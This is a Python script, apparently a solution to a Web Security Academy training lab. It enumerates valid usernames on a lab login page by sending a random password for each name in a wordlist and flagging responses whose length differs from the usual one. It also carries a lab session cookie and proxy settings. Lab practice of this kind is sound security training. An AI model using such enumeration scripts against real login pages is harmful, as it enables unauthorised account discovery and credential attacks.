import requests
import urllib3
import secrets
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:3333', 'https': 'http://127.0.0.1:3333'}

headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
  'Host': '0a2000fa03ebf65f84faeb55003800cd.web-security-academy.net',
  'Cookie': 'session=oWxwSmtx9Hk4Ltav7v3mAXjDGkp0hof8',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
  'Origin': 'https://0a2000fa03ebf65f84faeb55003800cd.web-security-academy.net',
  'Referer': 'https://0a2000fa03ebf65f84faeb55003800cd.web-security-academy.net/login'
}

num_of_requests_with_the_same_username = 1
with open("../user3.txt", "r") as file:
    while True:
        username = file.readline()
        if not username:  # End of file reached
            break
        for i in range(num_of_requests_with_the_same_username):
            password = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
            data = f"username={username}&password={password}"

            r = requests.post(
                "https://0a2000fa03ebf65f84faeb55003800cd.web-security-academy.net/login",
                # "http://127.0.0.1:3333",
                data=data,
                headers=headers,
                # verify=False,
                # allow_redirects=False,
                # proxies=proxies
            )
            if len(r.text) != 3132:
                print('(+) !!!!!!!!!!') 
                print(r.status_code)
                print(username)
                print('!!!!!!!!!!') 

